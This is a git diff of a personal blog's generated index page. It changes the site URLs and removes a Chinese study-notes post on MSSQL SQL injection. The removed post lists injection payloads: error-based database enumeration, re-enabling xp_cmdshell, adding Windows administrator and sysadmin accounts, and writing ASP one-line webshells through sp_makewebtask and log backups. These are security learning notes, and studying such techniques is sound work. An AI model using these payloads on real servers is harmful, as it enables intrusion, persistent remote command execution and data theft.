@@ -110,7 +110,7 @@
 
   <meta property="og:type" content="website">
 <meta property="og:title" content="fuubar2">
-<meta property="og:url" content="http://yoursite.com/index.html">
+<meta property="og:url" content="https://bookchi.github.io/index.html">
 <meta property="og:site_name" content="fuubar2">
 <meta property="og:locale" content="en">
 <meta name="twitter:card" content="summary">
@@ -121,7 +121,7 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/"/>
+  <link rel="canonical" href="https://bookchi.github.io/"/>
 
 
 
@@ -326,233 +326,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/23/mssql注入/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="fuubar">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="fuubar2">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/03/23/mssql注入/" itemprop="url">
-                  'mssql注入'
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2019-03-23 11:43:52 / Modified: 11:53:05" itemprop="dateCreated datePublished" datetime="2019-03-23T11:43:52+08:00">2019-03-23</time>
-            
-
-            
-              
-
-              
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h4 id="sqlserver数据库介绍及操作"><a href="#sqlserver数据库介绍及操作" class="headerlink" title="sqlserver数据库介绍及操作"></a>sqlserver数据库介绍及操作</h4><p>默认端口1433；</p>
-<p>创建一个数据库，默认创建在路径中web.mdf;</p>
-<p>任务，分离，删除链接，然后把创建的文件在默认路径中删掉就可以了；</p>
-<ol>
-<li><p>基础的查询语句：增删改查</p>
-<p><code>select * from table</code></p>
-</li>
-<li><p>数据库权限</p>
-<p>sa、db、public权限</p>
-<p>sa权利很大，db相当于普通票哪个用户，public相当于windows的guest用户；</p>
-</li>
-</ol>
-<h4 id="连接调用sqlserver数据库"><a href="#连接调用sqlserver数据库" class="headerlink" title="连接调用sqlserver数据库"></a>连接调用sqlserver数据库</h4><p>调用数据库的代码，一般写在配置文件里面config, conn；</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    set conn = server.createobject(&quot;adodb.connecton&quot;)</span><br><span class="line">    conn.open &quot;provider=sqloledb;source=local;uid=sa;pwd=***;database=database-name&quot;</span><br><span class="line"> %&gt;</span><br></pre></td></tr></table></figure>
-<p>可能在的目录：==inc==/conn.asp，config.asp，web.config</p>
-<h4 id="sqlserver注入"><a href="#sqlserver注入" class="headerlink" title="sqlserver注入"></a>sqlserver注入</h4><p>判断是否有注入</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">1. 判断是否有注入  (会有变化)</span><br><span class="line">and 1=1</span><br><span class="line">and 1=2</span><br><span class="line">/</span><br><span class="line">-0</span><br><span class="line">/*判断注入的方法是一样的*/</span><br><span class="line"></span><br><span class="line">2. 初步判断是否是mssql</span><br><span class="line">and user&gt;0</span><br><span class="line"></span><br><span class="line">3. 判断数据库系统</span><br><span class="line">and (select count(*) from sysobjects)&gt;0    /*mssql的系统表*/</span><br><span class="line">and (select count(*) from msysobjects)&gt;0   /*access的系统表*/</span><br><span class="line"></span><br><span class="line">4. 注入参数是字符</span><br><span class="line">and </span><br><span class="line"></span><br><span class="line">10. 测试权限结构   返回正常的话，就是对应的权限</span><br><span class="line">and 1=(select IS_SRVROLEMEMBER(&apos;sysadmin&apos;));--</span><br><span class="line">and 1=(select IS_SRROLEMEMEMBER(&apos;serveradmin&apos;));--</span><br><span class="line">and 1=(select IS_SRROLEMEMEMBER(&apos;setupadmin&apos;));--</span><br><span class="line">and 1=(select IS_SRROLEMEMEMBER(&apos;securityadmin&apos;));--</span><br><span class="line">and 1=(select IS_SRROLEMEMEMBER(&apos;diskadmin&apos;));--</span><br><span class="line">and 1=(select IS_SRROLEMEMEMBER(&apos;bulkadmin&apos;));--</span><br><span class="line">adn 1=(select IS_MEMBER(&apos;db_owner&apos;));--</span><br><span class="line"></span><br><span class="line">11. 添加mssql和系统账户</span><br><span class="line">exec master.dbo.sp_addlogin username;--</span><br><span class="line">exec master.dbo.sp_password null, username,password;--</span><br><span class="line">exec master.dbo.sp_addsrvrolemember sysadmin username;--</span><br><span class="line">exec master.dbo.xp_cmdshell username;--</span><br><span class="line">.....</span><br></pre></td></tr></table></figure>
-<ul>
-<li><p>手工判断注入</p>
-<p><code>http://testasp.vulnweb.com/showforum.asp?id=0 &#39;</code></p>
-</li>
-<li><p>获取数据库信息</p>
-<p><code>id=1 and 1=(select @@version) # 因为后面的查询结果是字符类型，转换失败，就爆出错误了</code></p>
-<p><code>id=@@version # 等价</code></p>
-</li>
-<li><p>获取当前数据库名称</p>
-<p><code>id=1 and 1=(select db_name()) # 也是由于类型不匹配</code></p>
-</li>
-<li><p>获取第一个用户数据库</p>
-<p><code>and 1=(select top 1 name from master..sysdatabases where dbid&gt;4)</code></p>
-<p><em>获取从上往下数的第一行的name属性</em></p>
-<ul>
-<li>判断接下来的数据库:</li>
-</ul>
-<p><code>and 1=(select top 1 name from master..sysdatabases where dbid&gt;5)</code> or</p>
-<p><code>and 1=(select top 1 name from master..sysdatabases where dbid&gt;4 and name&lt;&gt;&#39;web&#39;)</code></p>
-<p>会爆出错误：将nvarchar值’bookmis’转换为int类型时失败</p>
-<ul>
-<li>==非常牛逼的一个方法==</li>
-</ul>
-<p><code>and 1=(select name from master..sysdatabases for xml path) # 把所有的数据库名按照xml列出</code></p>
-</li>
-<li><p>获取第一张表</p>
-<p><code>?id=1 and 1=(select top 1 name from sysobjects where xtype=&#39;u&#39;) #原理就是mssql报错信息</code></p>
-</li>
-<li><p>获取表readers的列</p>
-<p><code>?id=1 and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name=&#39;readers&#39;))</code></p>
-</li>
-<li><p>获取表的数据</p>
-<p><code>?id=1 and 1=(select top 1 Reader_id from readers)</code></p>
-</li>
-</ul>
-<p>有过滤，如何绕过？</p>
-<p>​    比如大小写转换，%0a、+、/*<em>/代替空格； </em>+ 为什么可以代替空格？*</p>
-<blockquote>
-<p>那如果前端做的比较好，不显示报错信息呢？ syscolumns、sysdatabases 、sysobjects 具体代表了什么？</p>
-<ul>
-<li>sysdatabases和数据库信息有关，它的name表示所有的数据库，dbid列是他们的顺序，也是标识符</li>
-<li>sysobjects和数据库中的表的信息有关，name是表名，xtype=’u’表示用户表，id是表的标识符</li>
-<li>syscolumns和表的列属性有关，name是列名，可以通过表的id来选择所属的表。</li>
-</ul>
-</blockquote>
-<h4 id="sqlserver另类玩法"><a href="#sqlserver另类玩法" class="headerlink" title="sqlserver另类玩法"></a>sqlserver另类玩法</h4><p>#### </p>
-<ul>
-<li><p>利用mssql扩展存储注入攻击</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">1. 检测与恢复扩展存储</span><br><span class="line">/*判断xp_cmdhshell扩展存储是否存在*/</span><br><span class="line">and 1=(select name from master.dbo.sysobjects where xtype=&apos;x&apos; and name=&apos;xp_cmdshell&apos;)</span><br><span class="line"></span><br><span class="line">/*判断xp_regread扩展存储过程是否存在*/</span><br><span class="line">and 1=(select count(*) from master.dbo.sysobjects where name=&apos;xp_regread&apos;)</span><br><span class="line"></span><br><span class="line">/*恢复*/</span><br><span class="line">exec sp_configure &apos;show advanced options&apos;,1,reconfigure;exec sp_configure &apos;xp_cmdshell&apos;,1;reconfigure;</span><br><span class="line">exec sp_dropexetendedproc xp_cmdshell, &apos;xplog70.dll&apos;</span><br><span class="line"></span><br><span class="line">2. sa权限下扩展存储攻击 利用方法</span><br><span class="line">/*安装完插件之后；利用xp_cmdshell扩展，执行任意命令*/</span><br><span class="line">/*查看C盘*/</span><br><span class="line">drop table black</span><br><span class="line">create table black(dire varchar(7996) NULL, id int not null identity(1,1))</span><br><span class="line">insert into black exec master..xp_cmdshell &apos;dir C:\&apos; ;</span><br><span class="line">and 1=(select top 1 dire from black where id=1);</span><br><span class="line"></span><br><span class="line">/*新建windows用户*/</span><br><span class="line">exec master..xp_cmdshell &apos;net user test test /add&apos;</span><br><span class="line">exec master..xp_cmdshell &apos;net localgroup administrators test /add&apos;</span><br><span class="line">/*添加和删除一个SA权限的而用户test*/</span><br><span class="line">exec master.dbo.sp_addlogin test,password</span><br><span class="line">exec master.dbo.sap_addsrvrolemember test,sysadmin</span><br><span class="line">/*停掉或激活开个服务（need sa）*/</span><br><span class="line">exec master..xp_servicecontrol &apos;stop&apos;,&apos;schedule&apos;</span><br><span class="line">exec master..xp_servicecontrol &apos;start&apos;,&apos;schedule&apos;</span><br><span class="line"></span><br><span class="line">/*创建之后登陆，利用远程桌面，连接服务器（打开3389）*/</span><br><span class="line"></span><br><span class="line">/*开启远程数据库*/</span><br><span class="line">select * from OPENROWSET(&apos;SQLOLEDB&apos;,&apos;server=servername;uid=sa;pwd=_123&apos;, </span><br><span class="line">&apos;select * from table1&apos;)</span><br></pre></td></tr></table></figure>
-<p>如果防火墙只允许我访问80，可以把80改成别的，但是会影响原来的呀；——端口转发or源控码</p>
-</li>
-<li><p>利用sp_makewebtask写入一句话木马</p>
-<p>要知道绝对路径，否则写不进去</p>
-<p><code>;exec sp_makewebtask &#39;e:\www_iis\yjh.asp&#39;,&#39;select&#39;&#39;%3C%25%65%76%61%6C%20%72%65%71%75%65%73%74%28%22%63%68%6F%70%70%65%72%22%29%25%3E&#39;&#39;&#39;--</code></p>
-</li>
-<li><p>写入一句话木马</p>
-<p>找到web目录后，即可写入一句话木马(dbo权限)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">;alter database news set RECOVERY FULL </span><br><span class="line">;create table test(str image)-- </span><br><span class="line">;backup log news to disk=&apos;c:\test&apos; with init-- </span><br><span class="line">;insert into test(str)values (&apos;&lt;%excute(request(&quot;cmd&quot;))%&gt;&apos;)-- </span><br><span class="line">;backup log news to disk=&apos;c:\inetpub\wwwroot\yjh.asp&apos;-- </span><br><span class="line">;alter database news RECOVERY simple</span><br></pre></td></tr></table></figure>
-<p><a href="https://www.cnblogs.com/shanmao/archive/2012/11/15/2770878.html" target="_blank" rel="noopener">扩展参考</a></p>
-</li>
-</ul>
-<blockquote>
-<p>端口转发</p>
-<p>一句话木马是什么</p>
-<p>​    最直白的形式：把&lt;%execute(request(“value”))%&gt;插入    到网页里。</p>
-<p>一句话木马能干嘛</p>
-<p>​    - 似乎是执行远程的value值，这个值是命令</p>
-<p>一句话木马怎么写</p>
-<p>​    - &lt;%execute(request(“value”))%&gt;，</p>
-</blockquote>
-<h4 id="sqlserver差异备份、完全备份、权限入侵"><a href="#sqlserver差异备份、完全备份、权限入侵" class="headerlink" title="sqlserver差异备份、完全备份、权限入侵"></a>sqlserver差异备份、完全备份、权限入侵</h4>
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/08/12/hello-world/">
+    <link itemprop="mainEntityOfPage" href="https://bookchi.github.io/2018/08/12/hello-world/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="fuubar">
@@ -655,6 +429,10 @@
     
     
 
+    <div>
+      
+    </div>
+
     
 
     
@@ -724,7 +502,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">2</span>
+                    <span class="site-state-item-count">1</span>
                     <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
@@ -732,19 +510,6 @@
 
               
 
-              
-                
-                
-                <div class="site-state-item site-state-tags">
-                  <a href="/tags/index.html">
-                    
-                    
-                      
-                    
-                    <span class="site-state-item-count">1</span>
-                    <span class="site-state-item-name">tags</span>
-                  </a>
-                </div>
               
             </nav>
           
